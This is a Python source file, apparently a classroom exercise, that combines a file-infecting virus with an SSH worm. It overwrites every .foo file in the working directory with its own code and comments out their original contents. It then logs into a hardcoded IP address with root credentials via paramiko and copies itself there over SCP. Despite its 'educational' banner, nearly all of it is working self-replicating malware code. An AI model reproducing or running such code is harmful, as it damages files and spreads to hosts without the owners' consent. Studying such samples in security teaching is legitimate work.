#!/usr/bin/env python
import sys
import os
import glob

import random
import paramiko
import scp
import select
import signal

##   FooVirus.py
##   Author: Avi kak (kak@purdue.edu)
##   Date:   April 5, 2016; Updated April 6, 2022

print("""\nHELLO FROM FooVirus\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also.

Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload.  All it
does is to print out this message and comment out the
code in .foo files.\n\n""")


def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)
 


def get_new_username():
    return ['root']      # need a working username for debugging
    
def get_new_passwd():
    return ['mypassword']      # need a working username for debugging
    

def get_fresh_ipaddress():
    return ['172.17.0.2']   
                    
while True:
    usernames = get_new_username()
    passwds =   get_new_passwd()

    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddress():
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously 
                    # infected:
    
                    cmd = 'ls /root'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    received_list = error = None
                    error = stderr.readlines()
                    if error: 
                        print(error)
                        continue
                    
                    if "1805092_1.py" in stdout.read().decode('utf-8'):
                        print("already existed foovirus here")
                        continue
                    
                    scpcon = scp.SCPClient(ssh.get_transport())

                    IN = open(sys.argv[0], 'r')
                    
                    line_count = sum(1 for line in open(sys.argv[0])) # Initialize the counter
                    # Open the file for reading
                    
                    
                    virus = [line for (i,line) in enumerate(IN) if i <line_count]

                    for item in glob.glob("*.foo"):
                        IN = open(item, 'r')
                        all_of_it = IN.readlines()
                        IN.close()
                        if any('foovirus' in line for line in all_of_it): continue
                        os.chmod(item, 0o777)    
                        OUT = open(item, 'w')
                        OUT.writelines(virus)
                        all_of_it = ['#' + line for line in all_of_it]
                        OUT.writelines(all_of_it)
                        OUT.close()
                        

                    
                    # Now deposit a copy of AbraWorm.py at the target host:
                    scpcon.put(sys.argv[0])              
                    scpcon.close()
                except:
                    continue
         
    break


